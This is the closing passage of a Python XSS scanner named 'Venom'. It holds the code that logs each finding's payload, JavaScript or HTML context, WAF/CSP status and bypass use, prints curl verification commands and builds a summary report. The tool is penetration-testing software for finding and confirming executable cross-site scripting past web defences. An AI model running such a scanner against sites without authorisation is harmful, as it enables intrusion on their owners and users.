                'context': 'JavaScript' if 'script' in payload.lower() or 'eval' in payload.lower() or 'setTimeout' in payload.lower() or 'javascript:' in payload.lower() else 'HTML',
                'waf_status': self.waf_csp_status,
                'bypass': "Yes" if self.bypass_performed or self.use_403_bypass else "No",
                'params': params
            }
            if vuln in self.vulnerabilities:
                return
            self.vulnerabilities.append(vuln)
            output = f"{RED}╔════ XSS DETECTED [{timestamp}] ════╗{RESET}\n" \
                     f"{RED}║{RESET} Type: {WHITE}{vuln_type}{RESET}\n" \
                     f"{RED}║{RESET} URL: {WHITE}{full_url}{RESET}\n" \
                     f"{RED}║{RESET} Payload: {YELLOW}{payload}{RESET}\n" \
                     f"{RED}║{RESET} Context: {WHITE}{vuln['context']}{RESET}\n" \
                     f"{RED}║{RESET} Executed: {WHITE}{'Yes' if popup else 'No'}{RESET}\n" \
                     f"{RED}║{RESET} WAF/CSP: {WHITE}{self.waf_csp_status}{RESET} | Bypass: {WHITE}{'Yes' if self.bypass_performed or self.use_403_bypass else 'No'}{RESET}\n" \
                     f"{RED}║{RESET} Verify: {WHITE}curl -X {self.args.method.upper()} \"{full_url}\" {'-d \"' + urlencode(params) + '\"' if self.args.method == 'post' and params else ''}{RESET}\n"
            if popup:
                output += f"{RED}║{RESET} Proof: {GREEN}Potential execution detected!{RESET}\n"
            output += f"{RED}╚════════════════════════════════════╝{RESET}"
            print(output, flush=True)
            logging.info(output)

    def report(self) -> None:
        runtime = int(time.time() - self.start_time)
        executed_count = sum(1 for v in self.vulnerabilities if v['executed'])
        summary = f"{GREEN}╔════════════════════════════════════╗{RESET}\n" \
                  f"{GREEN}║       Venom XSS Scan Summary       ║{RESET}\n" \
                  f"{GREEN}╚════════════════════════════════════╝{RESET}\n" \
                  f"{WHITE}Scan Started:{RESET} {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(self.start_time))}\n" \
                  f"{WHITE}Scan Ended:{RESET} {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}\n" \
                  f"{WHITE}Total Runtime:{RESET} {runtime} seconds\n" \
                  f"{WHITE}URLs Scanned:{RESET} {len(self.visited_urls)}\n" \
                  f"{WHITE}Tests Performed:{RESET} {self.total_tests.get()}\n" \
                  f"{WHITE}Vulnerabilities Found:{RESET} {len(self.vulnerabilities)}\n" \
                  f"{WHITE}Executable Vulnerabilities:{RESET} {executed_count}\n" \
                  f"{WHITE}Reflected Only:{RESET} {len(self.vulnerabilities) - executed_count}\n"
        print(summary)
        logging.info(summary)
        
        if self.vulnerabilities:
            findings = f"\n{GREEN}╔════════════════════════════════════╗{RESET}\n" \
                       f"{GREEN}║       Detailed XSS Findings        ║{RESET}\n" \
                       f"{GREEN}╚════════════════════════════════════╝{RESET}\n"
            if self.args.full_report or len(self.vulnerabilities) <= 10:
                for i, vuln in enumerate(self.vulnerabilities, 1):
                    findings += f"{YELLOW}Vulnerability #{i}{RESET}\n" \
                                f"  {WHITE}Timestamp:{RESET} {vuln['timestamp']}\n" \
                                f"  {WHITE}Type:{RESET} {vuln['type']}\n" \
                                f"  {WHITE}URL:{RESET} {vuln['url']}\n" \
                                f"  {WHITE}Payload:{RESET} {vuln['payload']}\n" \
                                f"  {WHITE}Context:{RESET} {vuln['context']}\n" \
                                f"  {WHITE}Executed:{RESET} {'Yes' if vuln['executed'] else 'No'}\n" \
                                f"  {WHITE}WAF/CSP Status:{RESET} {vuln['waf_status']}\n" \
                                f"  {WHITE}Bypass Used:{RESET} {vuln['bypass']}\n" \
                                f"  {WHITE}Verification:{RESET} curl -X {self.args.method.upper()} \"{vuln['url']}\" {'-d \"' + urlencode(vuln['params']) + '\"' if self.args.method == 'post' and vuln['params'] else ''}\n" \
                                f"{GREEN}{'─' * 50}{RESET}\n"
            else:
                findings += f"Showing first 10 vulnerabilities (use --full-report for all):\n"
                for i, vuln in enumerate(self.vulnerabilities[:10], 1):
                    findings += f"{YELLOW}Vulnerability #{i}{RESET}\n" \
                                f"  {WHITE}Timestamp:{RESET} {vuln['timestamp']}\n" \
                                f"  {WHITE}Type:{RESET} {vuln['type']}\n" \
                                f"  {WHITE}URL:{RESET} {vuln['url']}\n" \
                                f"  {WHITE}Payload:{RESET} {vuln['payload']}\n" \
                                f"  {WHITE}Context:{RESET} {vuln['context']}\n" \
                                f"  {WHITE}Executed:{RESET} {'Yes' if vuln['executed'] else 'No'}\n" \
                                f"  {WHITE}WAF/CSP Status:{RESET} {vuln['waf_status']}\n" \
                                f"  {WHITE}Bypass Used:{RESET} {vuln['bypass']}\n" \
                                f"  {WHITE}Verification:{RESET} curl -X {self.args.method.upper()} \"{vuln['url']}\" {'-d \"' + urlencode(vuln['params']) + '\"' if self.args.method == 'post' and vuln['params'] else ''}\n" \
                                f"{GREEN}{'─' * 50}{RESET}\n"
            findings += f"{GREEN}Total Confirmed XSS Vulnerabilities: {len(self.vulnerabilities)}{RESET}\n"
            print(findings)
            logging.info(findings)
        else:
            no_vulns = f"\n{YELLOW}[!] No XSS vulnerabilities detected.{RESET}\n"
            print(no_vulns)
            logging.info(no_vulns)
        print(f"{GREEN}{'═' * 50}{RESET}")

if __name__ == "__main__":
    args = parse_args()
    scanner = None
    try:
        scanner = Venom(args)
        scanner.scan()
    except KeyboardInterrupt:
        logging.info("Scan interrupted by user")
        if scanner:
            scanner.running = False
            scanner.report()
        sys.exit(0)
    except Exception as e:
        logging.error(f"Fatal error: {e}")
        if scanner:
            scanner.report()
        sys.exit(1)
    finally:
        if scanner:
            scanner.report()
    input("Press Enter to exit...")
